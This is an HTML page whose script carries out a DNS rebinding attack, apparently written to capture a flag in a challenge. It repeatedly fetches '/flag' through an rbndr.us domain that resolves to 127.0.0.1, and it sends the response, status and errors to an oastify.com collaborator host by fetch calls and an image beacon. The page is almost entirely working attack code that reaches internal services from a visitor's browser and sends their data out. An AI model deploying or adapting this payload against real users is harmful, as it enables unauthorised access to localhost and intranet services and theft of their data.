<!DOCTYPE html>
<html>
<body>
<script>
const COLLAB = 'i6p18cu1mjc7zh6ztvw2fkelpcvcjc71.oastify.com';
const REBIND_DOMAIN = '8efac30e.7f000001.rbndr.us';

let attempt = 0;

function attack() {
    attempt++;
    
    // Target the rebinding domain on port 80
    const target = `http://${REBIND_DOMAIN}/flag`;
    
    console.log(`Attempt ${attempt}: ${target}`);
    fetch(`https://${COLLAB}/?attempt=${attempt}&target=${btoa(target)}`);
    
    fetch(target)
        .then(response => {
            // Log the response status
            fetch(`https://${COLLAB}/?status=${response.status}&attempt=${attempt}`);
            return response.text();
        })
        .then(data => {
            if (data && data.length > 0) {
                // SUCCESS! We got the flag
                console.log("FLAG FOUND:", data);
                
                // Send to collaborator via multiple methods
                fetch(`https://${COLLAB}/?flag=${encodeURIComponent(data)}`);
                fetch(`https://${COLLAB}/?data=${btoa(data)}`);
                
                // Image beacon
                const img = new Image();
                img.src = `https://${COLLAB}/img?flag=${btoa(data)}`;
                
                // Display
                document.body.innerHTML = `
                    <h1 style="color: green;">ðŸŽ‰ FLAG CAPTURED!</h1>
                    <h2>${data}</h2>
                `;
            } else {
                throw new Error('Empty response');
            }
        })
        .catch(error => {
            console.log(`Attempt ${attempt} failed:`, error.message);
            fetch(`https://${COLLAB}/?error=${encodeURIComponent(error.message)}&attempt=${attempt}`);
            
            // Retry after delay for DNS to rebind
            if (attempt < 15) {
                setTimeout(attack, 2000);
            }
        });
}

// Start the attack
fetch(`https://${COLLAB}/?starting_attack=1&domain=${REBIND_DOMAIN}`);
setTimeout(attack, 1000);
</script>
<h3>DNS Rebinding Attack on Port 80...</h3>
<p>Using: 8efac30e.7f000001.rbndr.us</p>
</body>
</html>
